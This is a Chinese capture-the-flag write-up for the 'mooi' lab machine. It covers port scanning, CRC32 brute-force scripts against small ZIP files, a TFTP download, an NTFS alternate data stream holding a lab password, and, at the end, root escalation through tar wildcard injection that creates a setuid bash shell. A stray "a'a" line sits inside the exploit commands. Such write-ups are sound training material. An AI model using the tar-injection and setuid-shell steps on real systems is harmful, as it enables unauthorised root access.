---
title: MazeSec靶机mooi记录
description:
date: 2026-04-12
tags:
  - 
  - 
  -
---

# mooi

# 目标信息

```
 靶机名称: mooi
 作者：mooi
 靶机ID：
 难度: 
 靶机地址: https://maze-sec.com
 靶机IP: 192.168.1.176
 攻击机IP: 192.168.1.185(Kali Linux)
```

# 一.信息收集

## 端口扫描

```
 ┌──(root㉿kali)-[~]
 └─# nmap   192.168.1.176
 ​
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 8080/tcp open  http-proxy
```

## 查看网页

有三关扫雷小游戏

### 第一关

通关后得到pass1.zip

```
 pass1：forget
```

还得到提示：

```
 pass2:真的有加密吗，不会是假的吧
```

## 第二关

通关后得到pass2.zip

根据提示可猜测出是伪加密

```
 pass2：the
```

提示：

```
 pass4:爆密码是爆不出的，看看文件有多大
```

## 第三关

第三关看源代码后发现是前端

直接到控制台输入：

```
 // 将所有不是雷的格子标记为已翻开
 for (let r = 0; r < ROWS; r++) {
     for (let c = 0; c < COLS; c++) {
         if (board[r][c] !== -1) revealed[r][c] = true;
     }
 }
 // 触发胜利检测
 checkWin();
```

得到pass4.zip

根据提示得知不能爆密码，查看文件原始大小，发现只有4字节

​![QQ_1775981283022](assets/QQ_1775981283022-20260513084611-f64vf2i.png)​

直接进行CRC32爆破内容

```
 import binascii
 import itertools
 import string
 import time
 import sys
 ​
 def crack_crc32(target_val, max_len=4):
     charset = string.ascii_letters + string.digits
 ​
     if isinstance(target_val, str):
         if target_val.startswith('0x') or target_val.startswith('0X'):
             target_crc = int(target_val, 16)
         else:
             target_crc = int(target_val)
     else:
         target_crc = target_val
     print(f"[*] 目标 CRC32: {hex(target_crc)} ({target_crc})")
     print(f"[*] 爆破范围: 1-{max_len} 位字符")
     print("-" * 40)
     start_time = time.time()
     for length in range(1, max_len + 1):
         print(f"[*] 正在尝试长度: {length}")
         for guess in itertools.product(charset, repeat=length):
             candidate = "".join(guess)
             if (binascii.crc32(candidate.encode()) & 0xFFFFFFFF) == target_crc:
                 duration = time.time() - start_time
                 print(f"\n[!] 爆破成功！")
                 print(f"[+] 明文内容: {candidate}")
                 print(f"[+] 消耗时间: {duration:.2f}s")
                 return candidate
 ​
     print(f"\n[-] 在 {max_len} 位长度内未找到匹配项。")
     return None
 target = "0x66b9a733"
 crack_crc32(target, 4)
```

```
 [!] 爆破成功！
 [+] 明文内容: LiVe
 [+] 消耗时间: 1.17s
```

提示：

```
快去8080端口看看吧，，有好东西在那里，你会用ftp吗？
```

进入8080端口，直接下载pass5.zip，解压还是要密码，原始文件大小是6，下载链接右边以及标题提示（a-z），用a-z进行CRC32爆破

```
import zlib
import itertools
import string
import time
def crack_crc32_lowercase(target_crc_hex, max_length=6):
    target_crc = int(target_crc_hex, 16)
    charset = string.ascii_lowercase
    print(f"[*] 目标 CRC32: 0x{target_crc:08X}")
    print(f"[*] 爆破字符集: 纯小写字母 (共 {len(charset)} 个字符)")
    print(f"[*] 最大爆破长度: {max_length}")
    print("[*] 爆破中，请稍候...\n")
    start_time = time.time()
    for length in range(1, max_length + 1):
        for attempt in itertools.product(charset, repeat=length):
            text = "".join(attempt)
            if zlib.crc32(text.encode('utf-8')) == target_crc:
                end_time = time.time()
                print(f"[+] 爆破成功！")
                print(f"[+] 对应的明文是: {text}")
                print(f"[+] 耗时: {end_time - start_time:.2f} 秒")
                return text
    print("[-] 爆破失败，在指定长度内未找到对应明文。")
    return None
if __name__ == "__main__":
    target = "0xea86a014"
    crack_crc32_lowercase(target, max_length=6)
```

```
[+] 爆破成功！
[+] 对应的明文是: thenow
[+] 耗时: 34.13 秒
```

第3关右下角有个小猫，有个提示

​![QQ_1775982198076](assets/QQ_1775982198076-20260513084611-w6azxft.png)​

```
翻译：对了,我说的ftp其实是tftp，你知道有什么区别吗
```

```
TFTP是基于 UDP 协议的
```

扫描udp8080端口

```
┌──(root㉿kali)-[~]
└─# nmap  -sU -p 8080 192.168.1.176
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 04:51 -0400
Nmap scan report for 192.168.1.176
Host is up (0.00095s latency).

PORT     STATE         SERVICE
8080/udp open|filtered http-alt
MAC Address: 08:00:27:73:43:68 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

已经得到pass1,2,4,5了

用TFTP下载pass3.zip

```
┌──(root㉿kali)-[~/aaa]
└─# tftp 192.168.1.176 8080
tftp> get pass3.zip
```

解压后得到

```
pass3：past
```

把所有的pass拼在一起得到：

```
forgetthepastLiVethenow
```

```
这其实是一句话：forget the past, live the now
无论过去，不问将来
```

用forgetthepastLiVethenow解压宝箱.zip后发现有个flag.vhd文件，挂载后打开flag文件看到

```
这里啥都没有，但是这个目录里不只一个文件
```

看看是不是NTFS隐写，发现是NTFS隐写后查看隐写文件得到mooi用户的密码

```
E:\>dir /r

 E:\ 的目录

2026/04/11  17:44                60 flag
                                 19 flag:flag:$DATA
               1 个文件             60 字节
               0 个目录      3,420,160 可用字节

E:\>more < flag:flag
mooi:mooi3811350908
```

# 三.提权root

用pspy查看进程发现每分钟都会执行一个程序

```
2026/04/12 05:40:01 CMD: UID=0     PID=2436   | tar -czf /var/backups/implant_archive.tar.gz
```

找一下是哪个脚本在调用它，通常这种自定义脚本会放在 /usr/local/bin/​ 里

```
mooi@mooi:/tmp$ cd /usr/local/bin
mooi@mooi:/usr/local/bin$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Apr 12 03:41 .
drwxr-xr-x 10 root root 4096 Mar 18  2025 ..
-rwxr-xr-x  1 root root  124 Apr 12 03:41 cyber_implant_backup.sh
mooi@mooi:/usr/local/bin$ cat cyber_implant_backup.sh
#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then
    exit 1
fi
cd /opt/implant_data
tar -czf /var/backups/implant_archive.tar.gz *
```

发现有个Tar 通配符注入漏洞，这个脚本会 cd /opt/implant_data​ 并在那里执行 tar *​

接下来利用这个漏洞提权

```
cd /opt/implant_data

echo 'cp /bin/bash b.sh; chmod +xs b.sh' > a.sh
chmod +x a.sh
a'a
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh a.sh"
```

```
mooi@mooi:/opt/implant_data$ ./b.sh -p
b-5.0# id
uid=1000(mooi) gid=1000(mooi) euid=0(root) egid=0(root) groups=0(root),1000(mooi)
```

